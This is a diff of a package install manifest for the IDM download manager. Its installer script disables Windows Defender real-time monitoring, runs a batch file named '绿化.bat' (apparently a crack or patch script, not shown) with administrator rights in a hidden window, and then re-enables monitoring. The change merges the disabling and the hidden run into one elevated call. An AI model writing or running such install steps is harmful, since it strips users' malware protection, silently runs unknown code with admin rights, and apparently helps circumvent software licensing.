@@ -7,9 +7,8 @@
 	"extract_dir": "IDM/Bin",
 	"installer": {
 		"script": [
-			"Start-Process powershell \"Set-MpPreference -DisableRealtimeMonitoring 1\"",
-			"Start-Process \"$dir\\`!`)绿化.bat\" -Verb RunAs -wait -WindowStyle hidden",
-			"Set-MpPreference -DisableRealtimeMonitoring 0"
+			"Start-Process powershell \"Set-MpPreference -DisableRealtimeMonitoring 1;$dir\\`!`)绿化.bat\" -Verb RunAs -WindowStyle hidden -wait",
+			"Start-Process powershell \"Set-MpPreference -DisableRealtimeMonitoring 0\" -Verb RunAs -WindowStyle hidden -wait"
 		]
 	},
 	"uninstaller": {
